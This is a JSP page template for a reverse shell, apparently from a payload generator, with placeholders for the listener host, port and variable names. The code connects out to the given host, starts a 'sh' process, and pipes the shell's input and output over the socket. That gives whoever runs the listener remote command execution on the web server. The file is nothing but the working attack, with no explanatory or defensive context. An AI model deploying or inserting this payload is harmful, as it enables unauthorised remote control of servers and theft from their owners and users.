<%@ page import="java.net.*,java.io.*" %>
<%
    String #IP# = "#LHOST#";
    int #PORT# = #LPORT#;
    Socket #S# = new Socket(#IP#, #PORT#);
    Process #P# = Runtime.getRuntime().exec("sh");
    InputStream #PI# = #P#.getInputStream();
    OutputStream #PO# = #P#.getOutputStream();
    InputStream #SI# = #S#.getInputStream();
    OutputStream #SO# = #S#.getOutputStream();
    new Thread(() -> { try { byte[] #B# = new byte[1400]; int #L#; while ((#L# = #PI#.read(#B#)) != -1) #SO#.write(#B#, 0, #L#); } catch (Exception e) {} }).start();
    new Thread(() -> { try { byte[] #B# = new byte[1400]; int #L#; while ((#L# = #SI#.read(#B#)) != -1) #PO#.write(#B#, 0, #L#); } catch (Exception e) {} }).start();
%>
